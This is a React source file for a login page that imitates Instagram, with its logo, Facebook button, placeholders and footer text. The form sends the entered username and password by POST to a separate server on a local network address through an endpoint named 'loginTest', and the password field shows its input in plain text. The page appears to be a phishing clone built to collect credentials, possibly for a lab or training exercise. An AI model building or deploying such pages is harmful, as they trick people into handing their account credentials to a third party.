import React, { useState } from 'react';
import './style/LoginPage.css';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [successMessage, setSuccessMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage('');
    setSuccessMessage('');

    try {
      const response = await fetch('http://192.168.1.156:3005/api/loginTest', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });

      const data = await response.json();

      if (response.ok) {
        setSuccessMessage('Connexion reussie !'); // Affiche un message de succès
      } else {
        setErrorMessage(data.message || 'Une erreur est survenue.');
      }
    } catch (error) {
      setErrorMessage('Erreur réseau. Veuillez réessayer.');
    }
  };

  return (
    <div className="login-page">
      <div className="login-container">
        <img
          src={require('./image/instagram.png')}
          alt="Instagram"
          className="instagram-logo"
        />
        <button className="facebook-login">
          <i className="fab fa-facebook-square"></i> Continue with Facebook
        </button>
        <div className="divider">
          <span>OR</span>
        </div>
        <form className="login-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <input
            type="text"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button type="submit" className="login-button">Log in</button>
        </form>
        {errorMessage && <p className="error-message">{errorMessage}</p>}
        {successMessage && <p className="success-message">{successMessage}</p>}
        <a href="/" className="forgot-password">Forgot password?</a>
      </div>
      <div className="signup-container">
        <p>
          Don't have an account? <a href="/">Sign up</a>
        </p>
      </div>
      <footer className="footer">
        <p>
          You can also <a href="/">report content</a> you believe is unlawful in your country without logging in.
        </p>
      </footer>
    </div>
  );
}

export default App;
